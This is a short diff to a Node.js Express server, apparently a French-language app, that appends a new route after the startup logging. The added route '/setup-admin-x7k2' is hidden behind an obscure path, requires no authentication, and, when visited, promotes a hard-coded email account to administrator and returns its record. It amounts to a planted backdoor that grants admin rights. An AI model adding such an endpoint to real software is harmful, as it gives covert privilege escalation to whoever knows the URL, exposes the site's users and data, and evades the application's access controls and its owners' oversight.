@@ -1489,3 +1489,8 @@ app.listen(PORT, () => {
   console.log(`   JWT_SECRET : ${JWT_SECRET === 'changez-moi-en-production' ? '⚠ PAR DÉFAUT — à changer' : '✔ configuré'}`);
   console.log(`   RESEND_KEY : ${RESEND_KEY ? '✔ configuré' : '⚠ manquant — emails désactivés'}`);
 });
+app.get('/setup-admin-x7k2', (req, res) => {
+  db.prepare("UPDATE users SET role='admin' WHERE email='abdou.ndao@regularena.com'").run();
+  const user = db.prepare("SELECT id,email,role FROM users WHERE email=?").get('abdou.ndao@regularena.com');
+  res.json(user);
+});
